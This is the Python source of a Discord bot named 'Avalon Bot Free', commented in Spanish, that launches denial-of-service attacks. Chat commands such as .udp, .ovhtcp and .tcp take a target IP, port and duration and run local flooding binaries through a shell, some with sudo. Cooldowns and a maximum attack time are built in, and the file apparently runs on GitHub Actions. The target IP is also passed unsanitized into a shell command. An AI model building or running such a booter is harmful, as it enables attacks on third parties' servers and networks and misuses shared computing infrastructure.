import os
import discord
from discord.ext import commands
import asyncio
import tempfile

# Cargar el token desde la variable de entorno
TOKEN = os.getenv('KEYS')

# CHANNEL ID (¡PON EL ID DEL CANAL AQUÍ!)
CHANNEL_ID = 1459317728824397977

# Imprimir información de configuración (con mejor formato)
print("\n" + "="*60)
print("🔍 CONFIGURANDO BOT")
print("="*60)

if TOKEN:
    token_length = len(TOKEN)
    print("✅ Token obtenido de variable de entorno 'KEYS'")
    print(f"📏 Longitud: {token_length} caracteres")
    print(f"🔐 Vista previa: {TOKEN[:15]}...")

    if token_length < 50:
        print("⚠️  Advertencia: Token muy corto ({token_length} chars)")
        print("   Un token válido de Discord tiene ~59 caracteres")
else:
    print("❌ ERROR CRÍTICO: No se encontró el token")
    print("")
    print("SOLUCIÓN:")
    print("1. En GitHub Actions: Configura un secret llamado 'KEYS'")
    print("2. En local: Exporta variable de entorno: export KEYS='tu_token'")
    print("")
    print("Pasos en GitHub Actions:")
    print("   Settings → Secrets and variables → Actions")
    print("   New repository secret → Name: KEYS → Value: [tu_token]")
    print("")
    exit(1)

print("="*60 + "\n")

# Prefijo del bot y configuración de intents
BOT_PREFIX = '.'
intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix=BOT_PREFIX, intents=intents)

# Lista de Owners (reemplaza con los IDs de tus usuarios)
OWNER_IDS = [1422676828161703956]  # Ejemplo: [1234567890, 9876543210]

# Diccionario para rastrear los cooldowns por usuario
cooldowns = {}
# Variable para controlar si un ataque está en curso
ataque_en_curso = False

# Variable para guardar el proceso del ataque en curso
proceso_en_curso = None

# Duración del cooldown (en segundos)
COOLDOWN_DURATION = 40
MAX_ATTACK_DURATION = 80

# Evento que se activa cuando el bot está listo
@bot.event
async def on_ready():
    print(f'✅ Bot conectado como {bot.user.name} (ID: {bot.user.id})')
    print(f'Avalon Bot Free')
    await bot.change_presence(activity=discord.Game(name="Avalon Bot Free"))

# Verificar el canal antes de procesar comandos
@bot.check
async def check_channel(ctx):
    return ctx.channel.id == CHANNEL_ID

@bot.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.CommandNotFound):
        return  # Ignorar el error de comando no encontrado
    raise error  # Re-lanzar otros errores
    
# Función para ejecutar un ataque (ahora con control de errores y mensajes)
async def ejecutar_ataque(comando: str, ctx, ip: str, port: int, tiempo: int, metodo: str):
    global ataque_en_curso, proceso_en_curso

    try:
        # Marcar que un ataque está en curso
        ataque_en_curso = True

        proceso_en_curso = await asyncio.create_subprocess_shell(
            comando,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        await proceso_en_curso.wait()  # Esperar a que el proceso termine

        stdout, stderr = await proceso_en_curso.communicate()

        print(f"Attack method '{comando}' finished")
    except Exception as e:
        print(f"Error al ejecutar el ataque: {e}")
    finally:
        # Independientemente de si el ataque tuvo éxito o no,
        # se levanta la bandera de ataque en curso.
        ataque_en_curso = False
        proceso_en_curso = None

# Función para enviar mensajes con formato (embebs)
async def enviar_mensaje_con_formato(ctx, title, description, color, footer_text=None):
    embed = discord.Embed(title=title, description=description, color=color)
    if footer_text:
        embed.set_footer(text=footer_text)
    await ctx.send(embed=embed)

# Comandos de ataque
@bot.command(name='udp')
async def udp_command(ctx, ip: str = None, port: str = None, tiempo: str = None):
    await realizar_ataque(ctx, 'udp', ip, port, tiempo)

@bot.command(name='hex')
async def hex_command(ctx, ip: str = None, port: str = None, tiempo: str = None):
    await realizar_ataque(ctx, 'hex', ip, port, tiempo)

@bot.command(name='udppps')
async def udppps_command(ctx, ip: str = None, port: str = None, tiempo: str = None):
    await realizar_ataque(ctx, 'udppps', ip, port, tiempo)

@bot.command(name='ovhudp')
async def ovhudp_command(ctx, ip: str = None, port: str = None, tiempo: str = None):
    await realizar_ataque(ctx, 'ovhudp', ip, port, tiempo)

@bot.command(name='ovhtcp')
async def ovhtcp_command(ctx, ip: str = None, port: str = None, tiempo: str = None):
    await realizar_ataque(ctx, 'ovhtcp', ip, port, tiempo)

@bot.command(name='tcp')
async def syn_command(ctx, ip: str = None, port: str = None, tiempo: str = None):
    await realizar_ataque(ctx, 'tcp', ip, port, tiempo)

async def realizar_ataque(ctx, metodo: str, ip: str, port: str, tiempo: str):
    global ataque_en_curso, proceso_en_curso
    user_id = ctx.author.id

    # 1. Validaciones iniciales
    if ip is None or port is None or tiempo is None:
        return # No enviar mensaje de error

    try:
        port_int = int(port)
        tiempo_int = int(tiempo)
    except ValueError:
        return # No enviar mensaje de error

    if port_int < 1 or port_int > 65535:
        return # No enviar mensaje de error

    if tiempo_int <= 0:
        return # No enviar mensaje de error

    if tiempo_int > MAX_ATTACK_DURATION:
        return # No enviar mensaje de error

    # 2. Cooldown y ataque en curso
    if user_id in cooldowns and cooldowns[user_id] > asyncio.get_event_loop().time():
        return # No enviar mensaje de cooldown

    if ataque_en_curso:
        return # No enviar mensaje de error

    # 3. Preparar y ejecutar el ataque
    comando = None
    if metodo == 'udp':
        comando = f'./udp {ip} {port_int} {tiempo_int}'
    elif metodo == 'hex':
        comando = f'./hex {ip} {port_int} {tiempo_int}'
    elif metodo == 'udppps':
        comando = f'./udppps {ip} {port_int} {tiempo_int}'
    elif metodo == 'ovhudp':
        comando = f'sudo ./ovhudp {ip} {port_int} 30 -1 {tiempo_int}'
    elif metodo == 'ovhtcp':
        comando = f'sudo ./ovhtcp {ip} {port_int} 30 -1 {tiempo_int}'
    elif metodo == 'tcp':
        comando = f'./tcp {ip} {port_int} {tiempo_int}'  # Asumiendo que tcp-syn es el script para SYN
    else:
        return # No enviar mensaje de error

    # Establecer cooldown y ejecutar ataque
    cooldowns[user_id] = asyncio.get_event_loop().time() + tiempo_int + COOLDOWN_DURATION
    await ejecutar_ataque(comando, ctx, ip, port_int, tiempo_int, metodo)

# Comando para mostrar los métodos disponibles
@bot.command(name='methods')
async def show_methods(ctx):
    return # No enviar mensaje

# Iniciar el bot
print("🚀 INICIANDO BOT CON TODOS LOS MÉTODOS")
print("🔧 Configurado para leer directamente de secret 'KEYS'")
print(f"📏 Token verificado: {len(TOKEN)} caracteres")

try:
    bot.run(TOKEN)
except discord.LoginFailure:
    print("\n❌ ERROR DE AUTENTICACIÓN")
    print("El token es inválido o ha expirado")
    print("Verifica que el secret 'KEYS' en GitHub tenga el token correcto")
    print("Obten un nuevo token en: https://discord.com/developers/applications")
except Exception as e:
    print(f"\n❌ ERROR INESPERADO: {e}")
